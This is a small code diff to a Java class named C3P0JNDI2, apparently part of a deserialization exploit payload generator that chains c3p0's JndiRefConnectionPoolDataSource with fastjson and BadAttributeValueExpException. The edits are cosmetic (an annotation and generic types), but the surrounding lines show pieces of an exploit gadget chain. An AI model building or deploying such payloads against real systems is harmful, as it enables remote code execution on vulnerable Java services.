@@ -9,6 +9,7 @@ import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Field;
 import java.util.HashMap;
 
+@SuppressWarnings({"unused"})
 @Dependencies({"com.mchange:c3p0:0.9.5.2", "com.alibaba.fastjson:com.alibaba.fastjson1.X"})
 @Authors({Authors.UNAM4})
 public class C3P0JNDI2 implements ObjectPayload<Object> {
@@ -32,7 +33,7 @@ public class C3P0JNDI2 implements ObjectPayload<Object> {
         valfield.setAccessible(true);
         valfield.set(val, jsonArray);
 
-        HashMap hashMap = new HashMap();
+        HashMap<JndiRefConnectionPoolDataSource, BadAttributeValueExpException> hashMap = new HashMap<>();
         hashMap.put(o, val);
         return hashMap;
     }
